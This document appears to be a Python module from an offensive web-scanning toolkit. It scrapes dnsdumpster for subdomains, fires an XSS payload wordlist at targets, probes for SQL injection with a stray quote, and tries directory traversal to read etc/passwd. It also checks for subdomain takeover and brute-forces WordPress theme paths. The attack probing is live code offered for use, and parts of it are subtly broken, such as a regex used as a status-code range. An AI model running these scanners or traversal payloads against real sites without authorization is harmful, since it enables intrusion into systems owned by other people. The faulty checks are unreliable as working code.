#-*- coding: utf-8 -*-
import requests,re,os,sys,readline
import asyncio,aiohttp,async_timeout,aiofiles
from . import  string_regex

merah = '\033[31m'
kuning = '\033[33m'
hijau = '\033[32m'
putih = '\033[0m'

class subdomain_scanner(object):

      def _start_scan(self,domain):
          self.domain = domain
          url = 'https://dnsdumpster.com'
          get_token = requests.get(url)
          token = re.findall("value=\'(.*?)\'",get_token.text)
          r = requests.post(
            url,
            data = {
                'csrfmiddlewaretoken':token[0],
                'targetip':self.domain
            },
            headers = {
                'Referer':url
            },
            cookies = {
                'csrftoken':token[0]
            }
          )
          lis = re.findall('http://(.*?)"',r.text)
          return lis

class xss_payload_vulnerability_scanner(object):

      async def scan(self,target,payload,s):
        self.target = target
        self.payload = payload
        self.s = s
        try:
           async with self.s.get(f'{self.target}{self.payload}') as resp:
             content = await resp.text()
             if self.payload in content:
                print(f'{hijau}[*]{putih} vulnerability : {resp.url}')
             else:
                print(f'{merah}[-]{putih} not vulnerability : {resp.url}')
             resp.closed
        except Exception as e:
             print(e)     
             
      async def _main(self,target):
        self.target = target
        async with aiohttp.ClientSession() as ses:
          async with aiofiles.open(f'{os.getcwd()}/lib/wordlist/xss_payload.txt',mode='r') as file:
            tk = [self.scan(self.target,x.rstrip(),ses) for x in file]
            await asyncio.gather(*tk)
      
      def start_scan(self,target):
          self.target = target
          lop = asyncio.get_event_loop()
          lop.run_until_complete(self._main(self.target))
          
class sqli_scanner(object):

      def sqli(self,target):
          self.target = target
          vuln = 0
          types = ''
          error = ''
          r = requests.get(f"{self.target}'")
          for a,b in string_regex.sql_errors.items():
              if re.search(b,r.text):
                 vuln += 1
                 types += a
                 error += b
              else:
                 pass   
          return vuln,types,error

class lfi_scanner(object):

      def lfi(self,target):
          self.target = target
          path = '../'
          for scan in range(1,20):
              p = path*scan
              r = requests.get(f'{self.target}{p}etc/passwd')
              if "root:x:0:0" in r.text:
                  print(f'{hijau}[*]{putih} vulnerability : {r.url}')
                  break
              else:
                  print(f'{merah}[-]{putih} not vulnerability : {r.url}')
                  
class subdomain_takeover_scanner(object):

      def takeover(self,target):
          self.target = target
          vuln = ''
          resp = requests.get(f"{self.target}")
          for a,b in string_regex.takeover_req.items():
              if re.search(b,resp.text,re.I) and re.search('[300-499]',str(resp.status_code),re.I):
                 vuln += a
                 break
              else:
                 pass
          return vuln       
          
class path_scanner(object):

      def get_path(self):
          lis = []
          with open(f'{os.getcwd()}/lib/wordlist/wp-theme.txt','r') as list:
               for i in list:
                   lis.append(i.rstrip())
          return lis

      async def get(self,target,path,s):
        self.target = target
        self.path = path
        self.s = s
        try:
            async with self.s.get(f'{self.target}/{self.path}',allow_redirects=False) as resp:
                if resp.status == 200:
                   print(f'{hijau}[+]{putih} {resp.url} ~> {resp.status}')
                elif resp.status == 404:
                   print(f'{merah}[x]{putih} {resp.url} ~> {resp.status}')
                else:
                   print(f'{kuning}[!]{putih} {resp.url} ~> {resp.status}')
                resp.closed
        except Exception as e:
            print(e)       
        
      async def _run(self,target,list_path):
        self.target = target
        self.list_path = list_path
        async with aiohttp.ClientSession() as ses:
          async with aiofiles.open(self.list_path,mode='r') as file:
            tk = [self.get(self.target,x.rstrip(),ses) async for x in file]
            await asyncio.gather(*tk)
    
        
      def main(self,target,file_path):
          self.target = target
          self.file_path = file_path
          lop = asyncio.new_event_loop()
          asyncio.set_event_loop(lop)
          lop.run_until_complete(self._run(self.target,self.file_path))
          